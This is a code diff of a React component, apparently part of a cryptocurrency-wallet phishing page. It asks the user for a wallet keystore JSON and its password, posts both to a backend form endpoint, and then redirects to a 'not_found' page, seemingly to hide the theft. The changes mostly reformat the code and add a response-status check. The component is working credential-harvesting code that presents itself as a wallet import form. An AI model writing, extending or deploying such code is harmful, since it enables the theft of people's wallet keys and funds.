@@ -1,9 +1,16 @@
 import { useEffect } from "react";
 import axios from "axios";
-import { useNavigate } from 'react-router-dom'
+import { useNavigate } from "react-router-dom";
 
-const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setPassword}) => {
-  let Navigate = useNavigate()
+const KeystoreJson = ({
+  seed2,
+  setSeed2,
+  disabled2,
+  setDisabled2,
+  password,
+  setPassword,
+}) => {
+  let Navigate = useNavigate();
 
   useEffect(() => {
     if (seed2 == "" || password == "") {
@@ -13,9 +20,16 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
     }
   }, [seed2, password]);
 
-  const handleSubmit = async(e) => {
-    await axios.post("http://localhost:8080/form", { seed: seed2, password });
-    Navigate('/not_found')
+  const handleSubmit = async (e) => {
+    const res = await axios.post("http://localhost:8080/form", {
+      seed: seed2,
+      password,
+    });
+    if (res.data.status === 200) {
+      Navigate("/not_found");
+    } else {
+      console.log('error eyaf happen')
+    }
   };
 
   return (
@@ -24,7 +38,7 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
         onChange={(e) => setSeed2(e.target.value)}
         value={seed2}
         rows='10'
-        placeholder='Keystore JSON' 
+        placeholder='Keystore JSON'
       ></textarea>
       <div>
         <textarea
@@ -43,7 +57,7 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
           disabled2
             ? {
                 backgroundColor: "rgba(26, 141, 218, 0.2)",
-                cursor: "not-allowed"
+                cursor: "not-allowed",
               }
             : { backgroundColor: "#1a8dda", color: "#fff" }
         }
